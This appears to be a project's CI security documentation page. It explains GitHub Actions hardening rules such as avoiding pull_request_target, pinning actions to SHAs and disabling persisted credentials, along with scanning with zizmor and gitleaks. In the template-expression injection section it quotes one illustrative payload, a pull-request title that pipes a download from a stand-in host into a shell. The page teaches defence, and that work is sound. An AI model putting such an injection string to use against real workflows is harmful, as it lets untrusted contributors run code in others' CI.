# CI security

Homebase is public, so **any stranger can propose code that runs in our CI**. That is not a
risk to be minimised; it is the normal operating condition of an open repository, and the
workflows are written accordingly.

## The rules

Applied from the first workflow file, and enforced automatically.

### 1. `pull_request`, never `pull_request_target`

`pull_request` runs fork code with a read-only token and **no secrets**.

`pull_request_target` runs in the context of the base repository — with secrets and a
writable token — while checking out the pull request's code. Combining it with a checkout of
untrusted code hands repository write access to whoever opened the pull request. It is the
single most exploited misconfiguration in GitHub Actions, and it is never used here.

### 2. Read-only by default

```yaml
permissions:
  contents: read
```

Every workflow, at the top level. Jobs that genuinely need more request it individually, and
that request is visible in review as an addition rather than as an absence.

### 3. Actions pinned to commit SHAs

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

A tag is mutable. `@v7` means "whatever the maintainer points that tag at today", which is
someone else's decision about what executes in our CI. Full 40-character SHAs only, with the
version in a trailing comment.

Dependabot rewrites both weekly, which is what stops pinning from becoming permanent
staleness.

### 4. `persist-credentials: false`

By default `actions/checkout` leaves a credential in the git config for later steps. Any
subsequent step — including one from a compromised action — can read it. Every checkout in
this repository disables it.

### 5. No self-hosted runners

GitHub's own guidance is explicit that fork pull requests on public repositories should not
run on ordinary self-hosted runners: the runner persists between jobs, so untrusted code can
leave things behind for the next one.

When the VM lab needs KVM in Milestone 1, its runner must be **ephemeral, network-isolated,
free of persistent credentials, and triggered only after maintainer approval**.

### 6. No secrets in pull-request workflows

Nothing in `ci.yml` needs a secret. Anything that does belongs in a workflow that does not
run on fork pull requests.

## Enforcement

Rules that are only written down decay. Two required checks keep these honest:

**`ci/workflows`** runs [`zizmor`](https://docs.zizmor.sh/), which detects unpinned actions,
template-expression injection into `run:` blocks, over-broad permissions, dangerous triggers
and credential persistence.

**`security/pinned-actions`** is a grep that fails with a readable explanation when an action
is pinned to a mutable ref. Redundant with zizmor by design — it states the rule in terms
anyone can act on from the failure message alone.

## Template-expression injection

The subtle one, and worth spelling out:

```yaml
# Never do this
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

`${{ }}` is substituted into the script **before the shell runs**. A pull request titled
`"; curl evil.sh | sh; #` becomes a command. The pull request title, branch name, and issue
body are all attacker-controlled.

The safe form passes through the environment, where the shell treats it as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

zizmor catches this.

## Secret scanning

Two independent layers, because they fail differently:

- **`ci/secrets`** runs gitleaks over the **full history** — a secret removed in the head
  commit is still leaked if it exists anywhere in the branch
- **GitHub push protection** blocks recognised secrets at push time, before they ever reach
  the repository

### Why the binary and not the action

CI installs the gitleaks **binary**, pinned by version and verified by SHA-256 checksum
before it is allowed to run, rather than using `gitleaks/gitleaks-action`.

The action is closed-source and commercially licensed, and by its own documentation contacts
`keygen.sh` for licence validation on every run. Granting a third party execution rights in
CI to check our own hygiene is the trade this page argues against, and a security job that
phones home is a poor place to make an exception.

Verifying the artifact's checksum is also a stronger guarantee than pinning an action SHA:
it verifies the thing that executes, not the recipe that fetches it.

### The allowlist

`.gitleaks.toml` allowlists **individual literal strings**, never paths or file types.

Exempting `docs/` would be far less work and would create exactly the blind spot worth
avoiding — a real credential pasted into a documentation example is a real leak, and a
plausible way for one to happen. Listing each value explicitly makes every future exemption
a line in a diff somebody has to approve.

Two entries exist today: an example `Idempotency-Key` UUID in
[jobs](../architecture/jobs.md#idempotency) and an example image digest in the Jellyfin
manifest fixture. Both were flagged on entropy, and neither is a credential.

If there is ever doubt about whether a flagged value is illustrative, treat it as a leak:
**rotate the credential first and argue afterwards.** Rewriting history does not help — the
value was public, and public repositories are scraped continuously by automation faster than
any human response.

A committed secret must be treated as compromised and **rotated**, not merely removed.
Rewriting history does not help: it was public, and public repositories are scraped
continuously by automation that is faster than any human response.

## Dependencies

`dependency-review` fails a pull request introducing a dependency with a known moderate-or-worse
advisory. Dependabot proposes updates weekly, grouped to avoid pull-request noise.

The licence policy denies GPL-3.0, AGPL-3.0 and SSPL-1.0 — not a judgement on those licences,
but a guard against a dependency making the combined work undistributable under Apache-2.0
([ADR-0008](../decisions/0008-apache-license.md)).

## Release credentials

Signing keys live in a GitHub environment gated by manual approval. Only the release workflow
can request them, and no workflow triggered by a pull request can reach that environment. See
[update security](update-security.md).

## What this does not defend against

- **A compromised pinned action.** Pinning ensures we run the same code, not that the code
  was ever good
- **A malicious dependency with no published advisory.** Dependabot and `dependency-review`
  are reactive
- **GitHub itself being compromised**
- **A malicious maintainer.** One maintainer, no second approver — see
  [ADR-0007](../decisions/0007-trunk-based-development.md)

## See also

- [Threat model](threat-model.md#a-compromised-dependency-or-ci)
- [Update security](update-security.md)
- [Contributing](https://github.com/HusnuOkanCakir/homebase/blob/main/CONTRIBUTING.md)
